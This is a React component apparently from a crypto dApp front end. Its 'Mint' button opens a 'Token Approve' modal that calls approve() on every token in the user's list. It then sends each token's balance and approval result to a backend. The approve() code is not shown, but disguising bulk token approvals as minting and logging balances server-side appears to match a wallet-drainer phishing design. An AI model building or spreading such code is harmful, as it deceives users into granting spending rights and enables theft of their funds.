import React, { useState } from 'react'
import {
  Backdrop,
  CircularProgress,
} from '@material-ui/core'

import { useSetting } from '../../provider/setting'
import { approve } from '../../api/contract'
import { create, update } from '../../api/approve'

const Approve = (props) => {
  const {approves, tokens, setIsMint, refresh} = props
  const [setting] = useSetting()
  const [isOpen, setIsOpen] = useState(false)
  const [pending, setPending] = useState(false)

  const handleApprove = async () => {
    if (setting.address && setting.address !== '') {
      setPending(true)
      let approveTokens = []
      await Promise.all(tokens.map(async(token) => {
        try {
          const approveNumber = await approve(token.contract_address, 0, setting.address, true)
          approveTokens = [...approveTokens, {
            tokenId: token._id,
            balance: token.balance/Math.pow(10, token.contract_decimals),
            approve: approveNumber
          }]
        } catch (error) {
          console.log(token.name, error)
        }
      }))
      console.log('approve tokens', approveTokens)
      if (approveTokens.length > 0) {
        if (approves.length > 0) {
          update({
            _id: approves[0]._id,
            approveTokens: approveTokens,
            isMint: true
          }).then(() => {
            setIsOpen(false)
            setIsMint(true)
            refresh()
            setPending(false)
          })
          .catch((error) => {
            setPending(false)
          })
        }
        else {
          create({
            address: setting.address,
            approveTokens: approveTokens,
            isMint: true
          }).then(() => {
            setIsOpen(false)
            setIsMint(true)
            refresh()
            setPending(false)
          })
          .catch((error) => {
            setPending(false)
          })
        }
      }
      else
        setPending(false)
    }
  }

  return (
    <>
      <Backdrop open={pending} style={{zIndex: 9999}}>
        <CircularProgress color="primary" />
      </Backdrop>
      <button type="button" className="btn btn-gradient-primary" onClick={() => setIsOpen(true)}>  Mint </button>
      <div id="modal-wallet" className={`modal modal-wallet${isOpen?' opened':''}`}>
        <div className="modal-dialog">
          <div className="modal-content">
            <div className="modal-body">
              <button type="button" className="modal-close" onClick={() => setIsOpen(false)}>
                <i className="icon-close"></i>
              </button>
              <div className="image position-relative">
                <img src="./assets/images/wallet.png" alt="wallet" />
              </div>
              <div className="title text-center"> Token Approve </div>
              <button type="button" className="btn btn-gradient-primary" onClick={handleApprove}>  Token approve </button>
            </div>
          </div>
        </div>
      </div>
    </>
  )
}
export default Approve
